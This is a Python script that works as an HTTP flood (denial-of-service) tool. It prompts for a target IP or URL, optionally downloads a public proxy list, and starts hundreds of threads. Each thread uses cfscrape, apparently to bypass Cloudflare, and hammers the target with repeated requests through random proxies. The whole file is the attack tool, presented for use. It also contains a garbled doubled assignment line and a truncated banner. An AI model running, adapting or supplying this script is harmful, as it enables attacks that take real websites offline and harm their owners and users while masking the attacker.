import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore

print("""
      $$$$$$$\ $$$$$$$\  $$$$$$$\  $$$$$$\  $$     $$|

----------------------------------------------------------
""")
def opth():
        for a in range(thr):
                x = threading.Thread(target=atk)
                x.start()
                print("Threads " + str(a+1) + " Created ")
        print("Hey! Brother, please make a cup of coffee, the attack thread is loading....")
        time.sleep(100)
        input("Press Enter To Start The Attack")
        global oo
        oo = True

oo = False
def main():
        global url
        global list
        global pprr
        global thr
        global per
        url = str(input("[+] Target [ IP/URL ] : " ))
        ssl = str(input("[+] Do You Want To Download Proxy ? [Y/n] : " ))
        ge = str(input("[+] Do You Want To Change The Agent ? [Y/n] : " ))
        if ge =='y':
                if ssl == 'y':
                        rsp = requests.getrsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes&anonymity=all')
                        with open('proxy.txt','wb') as fp:
                                fp.write(rsp.content)
                                print("[✓] HTTPS Proxy List!")


        list = str(input("Proxy Filename [proxy.txt]: " ))
        pprr = open(list).readlines()
        print("Get an agent : "  + "%d" %len(pprr))
        thr = int(input("[+] Threads (100-1000 default 500) : " ))
        per = int(input("[+] Times (1-100 default 70) : " ))
        opth()

def atk():
        pprr = open(list).readlines()
        proxy = random.choice(pprr).strip().split(":")
        s = cfscrape.create_scraper()
        s.proxies = {}
        s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
        s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
        time.sleep(5)
        while True:
                while oo:
                        try:
                                s.get(url)
                                print(Fore.CYAN + "Atacando --->  "  + str(url) + " Proxy~# " + str(proxy[0])+":"+str(proxy[1]))
                                try:
                                        for g in range(per):
                                                s.get(url)
                                                print(Fore.CYAN + "Atacando --->  "  + str(url)+Fore.CYAN + " Proxy~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
                                        s.close()
                                except:
                                        s.close()
                        except:
                                s.close()
                                print(Fore.RED + "Conexão com a proxy falhou!")


if __name__ == "__main__":
        main()
